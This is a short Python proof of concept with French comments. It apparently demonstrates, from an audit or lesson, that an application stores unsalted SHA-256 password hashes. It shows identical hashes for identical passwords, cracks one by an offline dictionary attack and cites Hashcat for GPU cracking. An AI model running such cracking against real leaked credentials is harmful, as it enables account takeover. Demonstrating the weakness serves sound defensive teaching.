import hashlib, time

def sha256_hex(p: str) -> str:
    return hashlib.sha256(p.encode()).hexdigest()

# --- 1. La fuite : contenu de USERS récupéré via la sauvegarde ---
# Ces empreintes sont IDENTIQUES à ce que /register stocke (vérifiable :
# enregistrer alice/bob par curl puis comparer le dict USERS).
leaked_USERS = {
    "alice": sha256_hex("soleil123"),
    "bob":   sha256_hex("soleil123"),   # même mot de passe qu'alice
    "carol": sha256_hex("motdepasse"),
}

# --- 2. Preuve de l'absence de sel ---
print("[*] Empreintes fuitées :")
for u, h in leaked_USERS.items():
    print(f"    {u:6} {h}")
assert leaked_USERS["alice"] == leaked_USERS["bob"]
print("[!] alice et bob -> MÊME empreinte : aucun sel. "
      "Rainbow table directement exploitable.\n")

# --- 3. Attaque par dictionnaire hors-ligne ---
wordlist = ["123456", "password", "soleil123", "qwerty", "admin"]  # ou rockyou.txt
victim, target = "alice", leaked_USERS["alice"]
start, found = time.perf_counter(), None
for i, cand in enumerate(wordlist, 1):
    if sha256_hex(cand) == target:
        found = cand; break
dt = (time.perf_counter() - start) * 1000
print(f"[+] Mot de passe de {victim} : {found!r} en {i} essais ({dt:.3f} ms)\n")

# --- 4. Débit : pourquoi SHA-256 est inadapté aux mots de passe ---
N, start = 1_000_000, time.perf_counter()
for i in range(N):
    sha256_hex(str(i))
rate = N / (time.perf_counter() - start)
print(f"[+] Débit SHA-256 : ~{rate:,.0f} empreintes/s (Python pur) ; "
      f"plusieurs milliards/s sur GPU (Hashcat -m 1400).")